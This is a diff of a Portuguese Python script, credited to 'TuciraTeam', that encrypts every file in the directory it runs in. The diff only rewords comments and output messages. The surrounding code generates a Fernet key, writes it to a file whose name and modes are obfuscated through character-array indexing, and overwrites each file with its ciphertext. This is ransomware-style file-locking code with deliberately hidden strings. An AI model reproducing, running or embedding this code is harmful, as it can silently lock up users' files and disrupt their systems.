@@ -1,6 +1,6 @@
 #! /usr/bin/env python3
 
-#Esta ferramenta serve para criptografar/decriptografar os ficheiros existentes no diretório, onde o ficheiro deste script se encontra!!
+#Esta ferramenta serve para criptografar/descriptografar os ficheiros existentes no diretório, onde o ficheiro deste script se encontra!!
 #Testado no Sistema: Linux
 #Autor: TuciraTeam
 #Ano: 2022
@@ -27,20 +27,20 @@ for file in os.listdir():
     if os.path.isfile(file): 
        s05.append(file) 
 
-# ACÇÃO QUE VAI GERAR A CHAVE CRIPTOGRÁFICA
+# ACÇÃO QUE VAI GERAR A CHAVE CRIPTOGRAFADA
 key = Fernet.generate_key() 
 
-# ACÇÃO QUE VAI GUARDAR A CHAVE CRIPTOGRAFICA NUM FICHEIRO
+# ACÇÃO QUE VAI GUARDAR A CHAVE CRIPTOGRAFADA NUM FICHEIRO
 with open(a[27]+a[20]+a[8]+a[5]+a[11]+a[5]+a[25]+a[27]+a[11]+a[5]+a[25], a[23]+a[2]) as thekey: 
         thekey.write(key) 
 
-# ACÇÃO QUE VAI CRIPTOGRAFAR OS FICHEIROS E/OU PASTAS EXISTENTES NA VARIVEL s05 COM A CHAVE CRIPTOGRAFICA GUARDADA NUM FICHEIRO
+# ACÇÃO QUE VAI CRIPTOGRAFAR OS FICHEIROS E/OU PASTAS EXISTENTES NA VARIVEL s05 COM A CHAVE CRIPTOGRAFADA GUARDADA NUM FICHEIRO
 for file in s05: 
-        print('\033[31m'+"Ficheiro:", file,"------> Encriptado"+'\033[0;0m') 
+        print('\033[31m'+"Ficheiro:", file,"------> Criptografado"+'\033[0;0m') 
         with open(file, a[18]+a[2]) as thefile: 
                 contents = thefile.read()
         contents_encrypted = Fernet(key).encrypt(contents)   
         with open(file, a[23]+a[2]) as thefile:
                 thefile.write(contents_encrypted) 
 	              
-print("\nFicheiros no Diretório '", os.getcwd(),"' foram Encriptados!")
+print("\nFicheiros no Diretório '", os.getcwd(),"' foram Criptografados!")
